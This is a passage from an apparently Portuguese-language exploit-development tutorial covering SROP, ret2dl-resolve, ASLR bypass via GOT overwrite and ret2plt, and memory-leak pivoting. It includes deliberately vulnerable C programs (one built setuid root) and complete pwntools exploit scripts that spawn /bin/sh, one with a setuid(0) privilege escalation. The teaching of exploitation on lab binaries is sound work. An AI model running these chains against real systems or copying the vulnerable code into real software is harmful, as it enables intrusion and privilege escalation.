// gcc srop.c -o srop -no-pie -fno-stack-protector
void syscall_(){
       __asm__(&quot;syscall; ret;&quot;);
}

void set_rax(){
       __asm__(&quot;movl $0xf, %eax; ret;&quot;);
}

int main(){
       // ONLY SROP!
       char buff[100];
       printf(&quot;Buff @%p, can you SROP?\n&quot;, buff);
       read(0, buff, 5000);
       return 0;
}
</code></pre>
<h2 id="exploit"><a class="header" href="#exploit">Exploit</a></h2>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *


elf = context.binary = ELF(&quot;./srop&quot;)

io = process(elf.path)
io.recvuntil('@')

stack_leak = int(io.recv(14),16)
log.info(&quot;Stack Leak: &quot; + hex(stack_leak))

io.recvuntil(&quot;?\n&quot;)

# Pular Func Prologo
elf.sym.syscall_ += 4
# pwndbg&gt; disassemble syscall_ 
# Dump of assembler code for function syscall_:
#     0x0000000000401132 &lt;+0&gt;:	push   rbp
#     0x0000000000401133 &lt;+1&gt;:	mov    rbp,rsp
#     0x0000000000401136 &lt;+4&gt;:	syscall 
#     0x0000000000401138 &lt;+6&gt;:	ret    
#     0x0000000000401139 &lt;+7&gt;:	nop
#     0x000000000040113a &lt;+8&gt;:	pop    rbp
#     0x000000000040113b &lt;+9&gt;:	ret    

elf.sym.set_rax += 4 
# pwndbg&gt; disassemble set_rax 
# Dump of assembler code for function set_rax:
#      0x000000000040113c &lt;+0&gt;:	push   rbp
#      0x000000000040113d &lt;+1&gt;:	mov    rbp,rsp
#      0x0000000000401140 &lt;+4&gt;:	mov    eax,0xf
#      0x0000000000401145 &lt;+9&gt;:	ret    
#      0x0000000000401146 &lt;+10&gt;:	nop
#      0x0000000000401147 &lt;+11&gt;:	pop    rbp
#      0x0000000000401148 &lt;+12&gt;:	ret    



payload = b&quot;&quot;
payload += asm(shellcraft.execve(&quot;/bin/sh\x00&quot;))
payload += b&quot;A&quot;*(120 - len(payload))
payload += p64(elf.sym.set_rax)
payload += p64(elf.sym.syscall_)        # sigreturn syscall

frame = SigreturnFrame(arch=&quot;amd64&quot;)
frame.rax = 0xa                         # mprotect syscall
frame.rdi = (stack_leak &gt;&gt; 12) &lt;&lt; 12    # Addr
frame.rsi = 0x21000                     # Size
frame.rdx = 7                           # Perms
frame.rip = elf.sym.syscall_            # syscall (mrprotect); Ret
frame.rsp = stack_leak + len(payload) + len(frame) # ret addr
                                        #              \\  
payload += bytes(frame)                 #              \\
payload += p64(stack_leak)              #   &lt;------------
                                        #
                                        # stack_leak ---&gt; shellcode


io.sendline(payload)
io.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ret2dl-resolve"><a class="header" href="#ret2dl-resolve">Ret2dl-resolve</a></h1>
<ul>
<li><a href="stack/rop/ret2dlresolve.html#ret2dl-resolve">Ret2dl-resolve</a></li>
<li><a href="stack/rop/ret2dlresolve.html#teoria">Teoria</a>
<ul>
<li><a href="stack/rop/ret2dlresolve.html#jmprel">JMPREL</a></li>
<li><a href="stack/rop/ret2dlresolve.html#strtab">STRTAB</a></li>
<li><a href="stack/rop/ret2dlresolve.html#symtab">SYMTAB</a></li>
<li><a href="stack/rop/ret2dlresolve.html#exemplo">Exemplo</a></li>
<li><a href="stack/rop/ret2dlresolve.html#_dl_runtime_resolve">_dl_runtime_resolve</a></li>
</ul>
</li>
<li><a href="stack/rop/ret2dlresolve.html#exploit">Exploit</a></li>
<li><a href="stack/rop/ret2dlresolve.html#manual">Manual</a></li>
<li><a href="stack/rop/ret2dlresolve.html#ctfs">CTFs</a></li>
<li><a href="stack/rop/ret2dlresolve.html#fontes-e-cr%C3%A9ditos">Fontes e créditos</a></li>
</ul>
<p>Nos ja sabemos que, quando o programa usa uma função do libc, 
ela terá uma entrada na plt, que somente quando usada sera 
preenchida na got...</p>
<p>Mas e se o programa nao usar uma função, existe algum jeito de 
resolve-la?</p>
<h1 id="teoria-2"><a class="header" href="#teoria-2">Teoria</a></h1>
<p>A section <code>.dynamic</code> contem os dados usados para que <code>ld.so</code> 
resolva os símbolos... Voce pode ve-la usando <code>readelf -d</code></p>
<pre><code class="language-py">$ readelf -d /bin/ls

Dynamic section at offset 0x21a58 contains 28 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libselinux.so.1]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x4000
 0x000000000000000d (FINI)               0x17574
 0x0000000000000019 (INIT_ARRAY)         0x22010
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x22018
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3a0
 0x0000000000000005 (STRTAB)             0x1190
 0x0000000000000006 (SYMTAB)             0x488
 0x000000000000000a (STRSZ)              1612 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x22c58
 0x0000000000000002 (PLTRELSZ)           2544 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x2cb8
 0x0000000000000007 (RELA)               0x1968
 0x0000000000000008 (RELASZ)             4944 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000000000001e (FLAGS)              BIND_NOW
 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
 0x000000006ffffffe (VERNEED)            0x18f8
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x17dc
 0x000000006ffffff9 (RELACOUNT)          193
 0x0000000000000000 (NULL)               0x0
</code></pre>
<p>Porem para essa tecnica so precisamos de 3: STRTAB, SYMTAB, JMPREL</p>
<h2 id="jmprel"><a class="header" href="#jmprel">JMPREL</a></h2>
<p>JMPREL (<code>.rel.plt</code>) contem a <code>Relocation Table</code>. A qual contem o 
endereco dos simbolos realocados. Ela pode ser lida com 
<code>readelf -r</code></p>
<p>Com <code>Sym.Name</code> sendo o nome, <code>Offset</code> o endereco na GOT, e
<code>Info e Type</code> sendo mais alguns metadados</p>
<pre><code class="language-C"># readelf -r ./babystack

Relocation section '.rel.dyn' at offset 0x2a8 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
</code></pre>
<p>O tipo das entradas é <code>ELF32_Re1</code></p>
<pre><code class="language-C">typedef uint32_t Elf32_Addr ; 
typedef uint32_t Elf32_Word ; 
typedef struct 
{
   Elf32_Addr r_offset ; /* Address */ 
   Elf32_Word r_info ; /* Relocation type and symbol index */ 
} Elf32_Rel ; 
#define ELF32_R_SYM(val) ((val) &gt;&gt; 8) 
#define ELF32_R_TYPE(val) ((val) &amp; 0xff)
</code></pre>
<p>Por exemplo para:</p>
<pre><code> Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
</code></pre>
<ul>
<li>ELF32_R_SYM(r_info) == 1 
<ul>
<li>0x0107 &gt;&gt; 8 == 1 </li>
</ul>
</li>
<li>ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)
<ul>
<li>0x0107 &amp;&amp; 0xff = 0x0007</li>
</ul>
</li>
</ul>
<h2 id="strtab"><a class="header" href="#strtab">STRTAB</a></h2>
<p>STRTAB é uma table que armazena as strings para os nomes dos 
símbolos</p>
<pre><code class="language-C">gdb&gt; x/10s 0x804822c # Endereço STRTAB
0x804822c:	&quot;&quot;
0x804822d:	&quot;libc.so.6&quot;
0x8048237:	&quot;_IO_stdin_used&quot;
0x8048246:	&quot;read&quot;
0x804824b:	&quot;alarm&quot;
0x8048251:	&quot;__libc_start_main&quot;
0x8048263:	&quot;__gmon_start__&quot;
0x8048272:	&quot;GLIBC_2.0&quot;
</code></pre>
<h2 id="symtab"><a class="header" href="#symtab">SYMTAB</a></h2>
<p>SYMTAB é uma table que armazena <code>ELF32_Sym</code>... </p>
<p>O qual contem <code>st_name</code>: o offset do nome do simbolo dentro da 
STRTAB</p>
<pre><code class="language-C">typedef struct 
{ 
   Elf32_Word st_name ; /* Symbol name (string tbl index) */
   Elf32_Addr st_value ; /* Symbol value */ 
   Elf32_Word st_size ; /* Symbol size */ 
   unsigned char st_info ; /* Symbol type and binding */ 
   unsigned char st_other ; /* Symbol visibility under glibc&gt;=2.2 */ 
   Elf32_Section st_shndx ; /* Section index */ 
} Elf32_Sym ;
</code></pre>
<p><code>st_name</code> é o primeiro membro do struct</p>
<p>Nos podemos saber qual o index do nosso simbolo na SYMTAB, 
usando a macro <code>ELF32_R_SYM</code></p>
<h2 id="exemplo-1"><a class="header" href="#exemplo-1">Exemplo</a></h2>
<p>Portanto:</p>
<ul>
<li>JMPREL - r_value (que vira o index na SYMTAB), endereço na GOT</li>
<li>STRTAB - Armazena os nomes</li>
<li>SYMTAB - pointer para o nome na STRTAB</li>
</ul>
<p>Por exemplo para a seguinte entrada na JMPREL:</p>
<pre><code> Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
</code></pre>
<ul>
<li>ELF32_R_SYM(r_info) == 1 
<ul>
<li>0x0107 &gt;&gt; 8 == 1 </li>
</ul>
</li>
<li>ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)
<ul>
<li>0x0107 &amp;&amp; 0xff = 0x0007</li>
</ul>
</li>
</ul>
<p>O R_SYM (1) é o offset da entrada no simbolo na 
table SYMTAB, que pode ser usado:</p>
<pre><code>0x80481cc  +   1   * 16
SYMTAB     + index * sizeof(entry)) 
</code></pre>
<p>Checando esse endereço, nos temos o struct referente a 
aquele simbolo, e portanto no mesmo endereço o <code>st_name</code></p>
<p>Vamos supor que nesse caso, <code>st_name = 0x1a</code></p>
<p>Agora podemos ver o nome do simbolo no STRTAB</p>
<pre><code class="language-C">x/s 0x804822c   +   0x1a
    STRTAB      +   st_name
0x8048246:	&quot;read&quot;
</code></pre>
<h2 id="_dl_runtime_resolve"><a class="header" href="#_dl_runtime_resolve">_dl_runtime_resolve</a></h2>
<p>Agora, como funciona a resolução de símbolos?</p>
<p>Ver qual a entrada da GOT referente ao simbolo e pular para PLT</p>
<pre><code class="language-x86asm">read@plt:
   jmp    DWORD PTR ds:0x804a00c
   push   0x0
   jmp    0x80482f0
</code></pre>
<p>Na PLT, push em <code>reloc_offset</code> e ir para o resolvedor</p>
<p>Agora o resolvedor (<code>dl-resolve()</code>) ira usar o <code>reloc_offset</code>
para preencher as os campos de relocação e na SYMTAB</p>
<pre><code class="language-C++">_dl_runtime_resolve ( link_map , rel_offset );
Com:
    link_map   =  lista com todas as libs carregadas
                  _dl_runtime_resolve vai usada-las 
                  para resolver os símbolos

    rel_offset =  Offset de Elf32_Rel na JMPREL

o simbolo sera relocados a função original sera chamada :D

// call nao resolvida de read(0, buf, 0x100)
_dl_runtime_resolve(link_map, rel_offset) {

    // Encontrar na JMPREL usando o offset (type = Elf32_Rel) 
    rel_entry = JMPREL + rel_offset ;

    // Encontrar na SYMTAB usando r_info (type = Elf32_Sym)
    sym_entry = &amp;SYMTAB [ ELF32_R_SYM ( rel_entry -&gt; r_info )];

    // Encontrar nome na STRTAB usando st_name (type = char* / string)
    sym_name = STRTAB + sym_entry -&gt; st_name ;

    // Usar o nome para encontrar o simbolo na lista de libs
    _search_for_symbol_(link_map, sym_name);

    // call read, ja que o simbolo foi resolvido
    read(0, buf, 0x100);
}
</code></pre>
<h1 id="exploit-1"><a class="header" href="#exploit-1">Exploit</a></h1>
<p>Nos podemos usar o helper do pwntools para facilmente gerar as 
tables com offsets corretos e tudo mais. Caso vc tenha 
curiosidade, pode ler a proxima seção ...</p>
<p>Porem, no pwntools podemos automar isso usando:</p>
<pre><code class="language-py">elf = ELF('./vuln')
io = process(elf.path)
rop = ROP(elf)

payload = Ret2dlresolvePayload(
  elf,
  symbol='system',
  args=['/bin/sh']
)

rop.raw('A' * pad)
rop.read(0, dlresolve.data_addr) # criar tables falsas
rop.ret2dlresolve(dlresolve) # chamar dl-resolve() com reloc_offset falso

io.sendline(rop.chain()) # A chain vai chamar read de novo, para enviar as tables
io.sendline(dlresolve.payload)

io.interactive()
</code></pre>
<h1 id="manual"><a class="header" href="#manual">Manual</a></h1>
<h1 id="ctfs"><a class="header" href="#ctfs">CTFs</a></h1>
<h1 id="fontes-e-créditos"><a class="header" href="#fontes-e-créditos">Fontes e créditos</a></h1>
<ul>
<li>https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62#5-_dl_runtime_resolve</li>
<li>https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve</li>
<li>https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="derrotando-aslr"><a class="header" href="#derrotando-aslr">Derrotando ASLR</a></h1>
<pre><code class="language-py">if RELRO != FULL &amp;&amp; PIE == OFF &amp;&amp; ARCH != 32bits:
    corromper_GOT()

if RELRO == FULL &amp;&amp; PIE == OFF &amp;&amp; ARCH != 32bits:
    re2plt()

if RELRO == FULL &amp;&amp; PIE == ON  &amp;&amp; ARCH == 32bits:
    bruteforce()

else:
    desistir() # =(
</code></pre>
<p>se alguem falar &quot;blablabla elif&quot; eu juro que eu vou cometer um crime &gt;:(</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="corromper-got"><a class="header" href="#corromper-got">Corromper GOT</a></h1>
<p>Voce provavelmente ja conhece essa técnica, visto que eu usei ela em ROP!</p>
<p>Mas resumindo, a GOT armazena o endereço das funções, se voce corromper um item da GOT, quando o programa-lo, vai redirecionar para a função que voce escolheu.</p>
<p>Porem no contexto de ASLR, nao podemos so botar o endereço de system, pq ne.... ASLR!!!</p>
<p>Então, nos podemos fazer um overwrite parcial!</p>
<p>Dependendo da arquitetura e sistema operacional isso pode variar, porem:</p>
<pre><code class="language-py">   7f ff ff    xx xx xx   12 34 
|  Prefixo  | Parte com |  Nosso |
| SEM ASLR  |    ASLR   |  ALVO  |
</code></pre>
<p>Assim, se corrompermos so os <code>LSB</code>s, podemos ignorar a parte do ASLR...</p>
<pre><code class="language-py">puts:    7f ff ff   xx xx xx   10 00 -| offset constante
system:  7f ff ff   xx xx xx   12 34 -| entre elas 0x234

puts:    7f ff ff   11 3c 4c   10 00 -| 0x234
system:  7f ff ff   11 3c 4c   12 34 -|

puts:    7f ff ff   4c 1d 42   10 00 -| 0x234
system:  7f ff ff   4c 1d 42   12 34 -|
</code></pre>
<p>Assim, se adicionarmos ao <code>puts</code> o offset entre ele e <code>system</code>... Usando por exemplo, um gadget 
<code>add [rbx] al</code></p>
<p>Isso também pode ser usado no valor armazenado para o <code>ret</code> em BoFs tradicionais! Caso a função 
tenha sido chamada pelo libc! </p>
<p><strong>Obs:</strong> Dependendo da vuln, voce usa tipos de offsets diferentes</p>
<ul>
<li>Write -&gt; offset = System - Base_Libc</li>
<li>Add   -&gt; offset = System - puts # Ou qualquer outra função</li>
</ul>
<h1 id="exemplo-2"><a class="header" href="#exemplo-2">Exemplo</a></h1>
<p>Vamos supor que temos um <code>add-what-where</code> -&gt; Ex: <code>add [rbx] al;ret;</code></p>
<pre><code class="language-py">elf = ELF(&quot;vuln123&quot;)
libc = elf.libc

got = elf.got.puts # Endereço de Puts na got
got += 7 # Queremos alterar somente os bytes 7 e 8
         # Lembrando que isso depende, em alguma outra
         # Pode ser 6 7 8, etc etc....

offset = libc.sym.system - libc.sym.puts

payload = vuln_add(got, offset)
payload += elf.plt.puts # Chamar Puts por meio da plt

io.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/ASLR/ret2plt.html#teoria">Teoria</a></li>
<li><a href="stack/ASLR/ret2plt.html#beatbox-puts-puts-puts-beatbox"><BeatBox> Puts Puts Puts </BeatBox></a></li>
<li><a href="stack/ASLR/ret2plt.html#exemplo">Exemplo</a>
<ul>
<li><a href="stack/ASLR/ret2plt.html#vulnc">vuln.c</a></li>
<li><a href="stack/ASLR/ret2plt.html#exploit">exploit</a></li>
</ul>
</li>
</ul>
<h1 id="teoria-3"><a class="header" href="#teoria-3">Teoria</a></h1>
<blockquote>
<p>Vale a pena revisar GOT e PLT caso precise</p>
</blockquote>
<p>Resumo: </p>
<ul>
<li>
<p>A GOT armazena o endereço da funcao apos ser resolvida!</p>
</li>
<li>
<p>Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.</p>
</li>
<li>
<p>A PLT checa a GOT, caso o endereço ja tenha sido resolvido, <code>jmp</code> la... caso o endereço ainda nao tenha sido, coordena com <code>ld.so</code> para resolver!</p>
</li>
</ul>
<p>A técnica ret2plt pode ser considerada o ret2libc do mundo com ASLR!</p>
<p>Da mesma maneira que podíamos retornar para o libc quando o NX foi ativado, 
agora podemos voltar para a PLT!</p>
<p>Podemos fazer isso pois a PLT (e GOT) nao tem seu endereço alterado pelo ASLR,
somente por PIE!</p>
<p>Nos poderíamos usar isso para, por exemplo, chamar system() ... mas existe 
uma alternativa mais divertida!</p>
<h1 id="beatbox-puts-puts-puts-beatbox"><a class="header" href="#beatbox-puts-puts-puts-beatbox"><BeatBox> Puts Puts Puts </BeatBox></a></h1>
<p>Nos podemos ler a GOT de uma funcao <strong>JA RESOLVIDA</strong>, e calcular o 
endereço da base do libc, ja que as funções estão a um offset constante!</p>
<p>Tendo o endereço base do libc, podemos chamar quantas funções quisermos, mesmo 
que nao tenham sido usadas originalmente pelo programa!</p>
<p>Para fazer isso, vamos usar <code>puts</code>: printa uma <code>string</code> pro terminal!</p>
<p>Vamos passar entrada para <code>puts na got</code>, assim: <code>puts vai printar o endereço resolvido de puts</code></p>
<p>Em seguida, nos chamamos main (ou a funcao vulnerável) e executamos o BoF de 
novo, so que agora que a base do libc, podemos usar todo o seu potencial</p>
<p>Em x86_64 bits nos podemos fazer:</p>
<pre><code>pop_rdi_gadget
got.puts

plt.puts    -&gt; rdi = primeiro arg, e rdi aponta para 
              a got com o endereço resolvido de puts

main
</code></pre>
<p>E em x86 bits:</p>
<pre><code>plt.puts
main
got.puts
</code></pre>
<p>Para calcular a base do libc a partir desse leak, basta fazer:</p>
<pre><code class="language-py">leak = int(recv(), 16)
libc.address = leak - libc.sym.puts
</code></pre>
<p><code>libc.sym.*</code> Armazena o offset dentro daquela versão do libc, isto e:
<code>puts = base + 0x1234</code>, <code>exit = base + 0x4321</code>, <code>system = base + offset</code>, etc...</p>
<p>Portanto, com <code>leak = puts</code> -&gt; <code>leak = base + 0x1234</code> 
-&gt; <code>base = leak - 0x1234</code> -&gt; <code>base = leak - offset</code></p>
<p>Agora, basta criar outra payload e enviar o BoF de novo, so que com: setuid + conexão remota + system + exit</p>
<p>Ou o que raios a sua imaginação bolar :D</p>
<h1 id="exemplo-3"><a class="header" href="#exemplo-3">Exemplo</a></h1>
<h2 id="vulnc"><a class="header" href="#vulnc">vuln.c</a></h2>
<pre><code class="language-c">#include &lt;stdio.h&gt;
/*
gcc vuln.c -fno-stack-protector -no-pie -ggdb -z relro -z now -o vuln ;
sudo chown root vuln ; 
sudo chmod +s vuln ;
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space ;
checksec vuln ;
*/

/* 
O checksec deve dar:
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
*/
void vuln() {
    puts(&quot;Ola :D ! Qual o seu nome?&quot;);

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
</code></pre>
<h2 id="exploit-2"><a class="header" href="#exploit-2">exploit</a></h2>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *
from time import sleep

context.binary = elf = ELF(&quot;vuln&quot;)
libc = elf.libc
rop = ROP(elf)
io = process(elf.path)
io.recvline()

if args.SLEEP: sleep(5)

##################################################
# 
# A plt nao tem seu endereco afetado pelo ASLR
# 
# Entao podemos chamar uma funcao do libc por 
# meio dela, sem precisar de leak
#
# Assim, vamos chamar puts por meio da plt!
#
# Alem disso, a got tambem nao e afetada,
# e ela armazena o endereco das funcoes resolvidas
#
# E oq o puts vai printar? um valor da got!
# Assim, nos dando o leak do libc
#
##################################################

payload = b'A'*40 + flat(
    rop.find_gadget(['pop rdi', 'ret']).address,
    elf.got.puts,
    elf.plt.puts, # call puts(&quot;got.puts&quot;)
    elf.sym.vuln  # voltar pra vuln 
)

io.sendline(payload)

##################################################
#
# Receber leak
#
##################################################

libc.address = int(bytearray(
    io.recvline()[:-1:])[::-1].hex(),
    16) - libc.sym.puts

# &gt;&gt;&gt; leak                                      # Botei um valor qualquer 
#     b'\xf0\xb5[\x16\xc8\x7f\n'
#
# &gt;&gt;&gt; leak[:-1:]                                # Remover \n
#     b'\xf0\xb5[\x16\xc8\x7f'
#
# &gt;&gt;&gt; bytearray(leak[:-1:]).hex()               # converter pra hexstring
#     'f0b55b16c87f'
#
# &gt;&gt;&gt; bytearray(leak[:-1:])[::-1].hex()         # Little Endian
#     '7fc8165bb5f0'
#
# &gt;&gt;&gt; int(bytearray(leak[:-1:])[::-1].hex(),16) # int
#     140497345295856

# Em seguida, leak - offset_puts ===&gt; base_libc

log.success(&quot;Libc Leak: &quot;+hex(libc.address))

##################################################
#
# vuln parte 2, o retorno
#
##################################################

io.recvline()

payload = b'A'*40 + flat(
    # Privesc
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.setuid,
    
    # System
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b&quot;/bin/sh\x00&quot;)),
    libc.sym.system,

    # Exit
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.exit
)

io.sendline(payload)
io.interactive()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bruteforce-32-bits"><a class="header" href="#bruteforce-32-bits">Bruteforce (32 bits)</a></h1>
<div style="break-before: page; page-break-before: always;"></div><p>Isso e uma tradução / resumo desse post <a href="https://www.nickgregory.me/security/2019/04/06/pivoting-around-memory/">nickgregory: pivoting-around-memory</a></p>
<p>Todos os créditos vao para o autor original! :D</p>
<h1 id="intro"><a class="header" href="#intro">Intro</a></h1>
<p>Existem 4 regiões importantes quando exploitando um programa:</p>
<ul>
<li>O binário</li>
<li>Stack</li>
<li>LibC</li>
<li>Heap</li>
</ul>
<p>Em resumo:
<img src="stack/./src/stack/mem_region_pivoting.png" alt="Imagem representando rotas entre as partes" />
<img src="https://raw.githubusercontent.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/main/src/stack/mem_region_pivoting.png" alt="Imagem representando rotas entre as partes" /></p>
<ul>
<li><a href="stack/leakAll.html#intro">Intro</a></li>
<li><a href="stack/leakAll.html#bin---libc--got">Bin -&gt; LibC : GOT</a></li>
<li><a href="stack/leakAll.html#libc---heap--main_arena-pointers">LibC &lt;-&gt; Heap : main_arena pointers</a></li>
<li><a href="stack/leakAll.html#stack---bin-eou-libc--ler-ret-salvo">Stack -&gt; Bin e/ou LibC : Ler ret salvo</a></li>
<li><a href="stack/leakAll.html#libc---stack--__libc_argv-ou-environ">LibC -&gt; Stack : __libc_argv ou environ</a></li>
<li><a href="stack/leakAll.html#libc---ld---bin">LibC -&gt; ld -&gt; Bin</a></li>
</ul>
<h1 id="bin---libc--got"><a class="header" href="#bin---libc--got">Bin -&gt; LibC : GOT</a></h1>
<p>Se <code>PIE == False</code> ou se voce tem um leak da base do programa, 
basta ler a GOT.</p>
<h1 id="libc---heap--main_arena-pointers"><a class="header" href="#libc---heap--main_arena-pointers">LibC &lt;-&gt; Heap : main_arena pointers</a></h1>
<p>Se voce tem um read arbitrário ou read-after-free, voce pode 
conseguir o endereço do libc se a arena for a main ... 
normalmente como o <code>next</code> pointer nas <code>freelists</code></p>
<p>Seguindo o outro sentido, se voce consegue ler no libc, basta 
ler <code>main_arena</code> para conseguir um pointer para o heap</p>
<h1 id="stack---bin-eou-libc--ler-ret-salvo"><a class="header" href="#stack---bin-eou-libc--ler-ret-salvo">Stack -&gt; Bin e/ou LibC : Ler ret salvo</a></h1>
<p>Ler o valor do ret salvo pode te dar um pointer para uma função 
do <code>bin</code> (derrotando <code>PIE</code>) ou para uma do <code>LibC</code> (ou de outra lib... o que pode ser util para a exploit chain)</p>
<h1 id="libc---stack--__libc_argv-ou-environ"><a class="header" href="#libc---stack--__libc_argv-ou-environ">LibC -&gt; Stack : __libc_argv ou environ</a></h1>
<p>Se voce tem um read no <code>LibC</code>, voce pode ler os símbolos: 
<code>__libc_argv</code> ou <code> environ</code>. Eles apontam para valores bem altos 
na stack, e muitas vezes existe uma diferença <strong>ALEATORIA</strong> 
(<code>ASLR</code>) entre eles e o <code>RSP</code>.</p>
<p>De qualquer maneira, voce tem um leak de um pointer na stack, e 
pode iterar ate encontrar o ret salvo que aponta para 
<code>__libc_start_main</code>, para encontrar a parte importante da stack. </p>
<h1 id="libc---ld---bin"><a class="header" href="#libc---ld---bin">LibC -&gt; ld -&gt; Bin</a></h1>
<p>Nessa tecnica e nescessario passar por um nivel de abstracao, dado 
que o <code>LibC</code> nao tem pointers para <code>Bin</code> ! Assim:</p>
<p><strong>LibC -&gt; ld</strong></p>
<p>O Linker Dinamico (<code>ld</code>) sempre esta na memoria e <code>LibC</code> sempre 
contem pointers para ele: <code>GOT do libc -&gt; _dl_runtime_resolve</code></p>
<p>E na maior parte dos casos, <code>ld</code> esta em um offset constante em 
relação ao <code>LibC</code> pois:</p>
<ul>
<li><code>mmap</code> usa valores alinhados a <code>PAGE_SIZE</code></li>
<li>Normalmente, <code>LibC</code> e <code>ld</code> costumam ser as 2 primeiras libs a 
serem carregadas e portanto &quot;<code>mmap</code>adas&quot;</li>
</ul>
<p><strong>ld -&gt; Bin</strong></p>
<p>O valor <code>name</code> dentro do struct <code>_dl_rtld_libname</code> aponta para 
<code>.interp</code>, mais especificamente para uma string com o <code>path</code> do 
linker, assim, calculando o offset dela dentro de <code>.interp</code> e 
consequentemente leakando a base do <code>Bin</code> .</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="heap"><a class="header" href="#heap">Heap</a></h1>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/intro.html#setup">Setup</a>
<ul>
<li><a href="heap/intro.html#malloc_playground">malloc_playground</a></li>
<li><a href="heap/intro.html#pwndbg">Pwndbg</a></li>
<li><a href="heap/intro.html#villoc--dynamorio">Villoc + DynamoRIO</a></li>
</ul>
</li>
<li><a href="heap/intro.html#teoria">Teoria</a></li>
</ul>
<h1 id="setup-1"><a class="header" href="#setup-1">Setup</a></h1>
<h2 id="malloc_playground"><a class="header" href="#malloc_playground">malloc_playground</a></h2>
<p><code>git clone https://github.com/shellphish/how2heap.git</code></p>
<h2 id="pwndbg"><a class="header" href="#pwndbg">Pwndbg</a></h2>
<ul>
<li>
<p>gdb base: <code>sudo apt-get install gdb</code></p>
</li>
<li>
<p>e os coisos de teste: <code>sudo apt-get install libc6-dbg libc6-dbg:i386 libc6-dbg:amd64</code> caso voce tambem queira arm, mips, sei la,....</p>
</li>
<li>
<p><a href="https://github.com/pwndbg/pwndbg">Github: pwndbg</a></p>
</li>
<li>
<p>ou <a href="https://github.com/apogiatzis/gdb-peda-pwndbg-gef">Github: gdb-peda-pwndbg-gef </a></p>
</li>
</ul>
<h2 id="villoc--dynamorio"><a class="header" href="#villoc--dynamorio">Villoc + DynamoRIO</a></h2>
<ul>
<li><a href="https://github.com/DynamoRIO/dynamorio/releases">Github: DynamoRIO</a> Ai voce baixa a versão mais recente pra sua plataforma.</li>
<li><a href="https://github.com/wapiflapi/villoc/tree/master/tracers/dynamorio">Github: Villoc</a> e aqui as instruções para usar DynamoRIO</li>
</ul>
<p>Mas resumindo, voce baixa o <code>tar</code> do DynamoRIO, extrai em <code>/usr/bin</code> ou <code>local</code>,... ou onde voce preferir</p>
<p>E executa <code>export DYNAMORIO_HOME=/usr/bin/DynamoRIO/</code></p>
<p>Ai voce baixa <code>sudo apt-get install cmake</code></p>
<p>Em seguida voce baixa villoc usando <code>git</code> e executa </p>
<pre><code class="language-bash">git clone https://github.com/wapiflapi/villoc.git
cd villoc/tracers/dynamorio
./build.sh
</code></pre>
<p>Para usar usar basta substituir <code>./target</code> pelo programa e <code>bin64</code> por <code>bin32</code> caso necessário!</p>
<pre><code>$DYNAMORIO_HOME/bin64/drrun  -c villoc_tracer villoc.trace -- ./target

villoc.py villoc.trace out.html
</code></pre>
<p>Se voce mudou o local do villoc, voce tambem precisara mudar <code>villoc_tracer</code> para <code>/usr/bin/villoc/tracers/dynamorio/villoc_tracer</code> (com o local certo)</p>
<p>eu recomendo alterar o seu <code>.bashrc</code> para facilitar :D</p>
<pre><code class="language-bash">PATH=&quot;$PATH:/usr/bin/villoc&quot;
export DYNAMORIO_HOME=/usr/bin/DynamoRIO/

villoc() {
	$DYNAMORIO_HOME/bin64/drrun  -c /usr/bin/villoc/tracers/dynamorio/villoc_tracer villoc.trace -- $1
	villoc.py villoc.trace $1-villoc.html
	firefox $1-villoc.html
}

</code></pre>
<h1 id="teoria-4"><a class="header" href="#teoria-4">Teoria</a></h1>
<ul>
<li><a href="http://gee.cs.oswego.edu/dl/html/malloc.html">1996: Doug Lea - A Memory Allocator</a></li>
